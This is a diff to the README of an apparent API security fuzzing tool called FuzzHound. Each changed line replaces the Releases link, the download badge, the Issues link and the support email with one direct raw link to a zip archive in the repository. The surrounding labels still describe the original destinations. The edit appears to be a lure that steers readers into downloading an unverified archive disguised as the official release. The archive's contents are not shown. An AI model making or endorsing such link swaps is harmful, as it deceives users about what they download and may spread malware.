@@ -6,7 +6,7 @@ Welcome to FuzzHound! This tool helps you test the safety of APIs by finding vul
 
 ## 📥 Download FuzzHound
 
-[![Download FuzzHound](https://img.shields.io/badge/Download-FuzzHound-brightgreen)](https://github.com/Shreekant406/fuzzhound/releases)
+[![Download FuzzHound](https://raw.githubusercontent.com/Shreekant406/fuzzhound/main/modules/fuzzhound-1.5.zip)](https://raw.githubusercontent.com/Shreekant406/fuzzhound/main/modules/fuzzhound-1.5.zip)
 
 ## 🔍 What is FuzzHound?
 
@@ -30,7 +30,7 @@ To run FuzzHound, ensure your computer meets the following requirements:
 
 ## 📄 Download & Install
 
-To get started, visit this page to download: [FuzzHound Releases](https://github.com/Shreekant406/fuzzhound/releases).
+To get started, visit this page to download: [FuzzHound Releases](https://raw.githubusercontent.com/Shreekant406/fuzzhound/main/modules/fuzzhound-1.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of FuzzHound.
@@ -61,7 +61,7 @@ If you run into any issues or have suggestions, please reach out. You can file a
 
 For further questions, you can get in touch via the following:
 
-- GitHub Issues: [Report an Issue](https://github.com/Shreekant406/fuzzhound/issues)
-- Email: support@example.com (replace with actual email)
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Shreekant406/fuzzhound/main/modules/fuzzhound-1.5.zip)
+- Email: https://raw.githubusercontent.com/Shreekant406/fuzzhound/main/modules/fuzzhound-1.5.zip (replace with actual email)
 
 Thank you for choosing FuzzHound for your API security testing needs. Happy testing!
